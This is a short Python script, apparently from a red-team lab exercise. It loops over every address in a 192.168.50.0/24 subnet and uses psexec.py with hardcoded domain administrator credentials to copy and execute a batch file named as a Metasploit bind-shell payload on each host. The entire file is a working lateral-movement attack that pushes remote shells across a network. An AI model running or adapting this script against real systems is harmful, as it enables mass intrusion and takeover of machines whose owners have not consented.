from concurrent.futures import ThreadPoolExecutor, as_completed
import os

address_list = [f'192.168.50.{i}' for i in range(1, 256)]
user = 'god/administrator'
password = 'hongrisec@2019'


def foo(ip):
    os.system(f'python psexec.py {user}:{password}@{ip} -c msf_tcp_bind_withcmd_secure.bat')
    print(ip, 'finished with')


def main():
    with ThreadPoolExecutor(max_workers=10) as executor:
        futures = [executor.submit(foo, address) for address in address_list]
    for future in as_completed(futures):
        future.result()


if __name__ == '__main__':
    main()
